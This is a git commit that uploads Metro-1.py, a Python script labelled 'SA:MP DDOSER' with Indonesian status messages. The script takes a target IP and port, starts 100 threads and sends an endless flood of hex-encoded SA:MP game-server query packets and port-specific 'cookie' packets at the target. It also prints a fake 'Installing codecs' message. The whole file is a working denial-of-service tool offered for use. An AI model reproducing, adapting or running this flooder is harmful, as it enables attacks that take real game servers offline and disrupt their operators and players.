3bc98c90e52238fe14ec977b7e9fead8c17949ff
KingAttackError404 <135358752+KingAttackError404@users.noreply.github.com>
2023-06-07 14:56:42 +0700

    Add files via upload

---
+++ Metro-1.py
@@ -0,0 +1,65 @@
+
+import random,socket,threading
+import struct,codecs,sys
+import time,os
+os.system("clear")
+print("Installing codecs")
+time.sleep(5)
+os.system("clear")
+
+ip = sys.argv[1]
+port = sys.argv[2]
+orgip =ip
+
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("021efd40","hex_codec"),#cookie port 6969 
+                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
+                       ]
+
+print(" Menyerang Ip >%s Dan Port >%s"%(orgip,port))
+
+class MyThread(threading.Thread):
+     def run(self):
+         while True:
+                sock = socket.socket(
+                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP TCP OVH
+                
+                msg = Pacotes[random.randrange(0,3)]
+                     
+                sock.sendto(msg, (ip, int(port)))
+                
+                
+                if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
+                elif(int(port) == 6969):
+                    sock.sendto(Pacotes[9], (ip, int(port)))    
+                
+
+if __name__ == '__main__':
+    try:
+     for x in range(100):                                    
+            mythread = MyThread()  
+            mythread.start()                                  
+            time.sleep(.1)    
+    except(KeyboardInterrupt):
+         os.system('cls' if os.name == 'nt' else 'clear')
+         
+         print('#########################################################################')
+         print('SA:MP DDOSER')
+         print('#########################################################################')
+         print('\n\n')
+         print('Menyerang ip {} Stoped'.format(orgip))
+         pass
